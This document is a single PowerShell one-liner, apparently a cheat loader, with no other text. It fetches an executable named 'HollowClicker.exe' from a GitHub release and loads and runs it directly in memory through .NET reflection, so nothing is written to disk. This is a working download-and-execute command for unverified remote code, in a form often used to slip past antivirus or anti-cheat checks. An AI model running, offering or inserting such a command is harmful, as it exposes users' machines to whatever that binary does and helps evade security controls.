[System.Reflection.Assembly]::Load((Invoke-WebRequest "https://github.com/loader-cheat/Hollow-Clicker-Public/releases/download/Release/HollowClicker.exe").Content).EntryPoint.Invoke($null, $null)
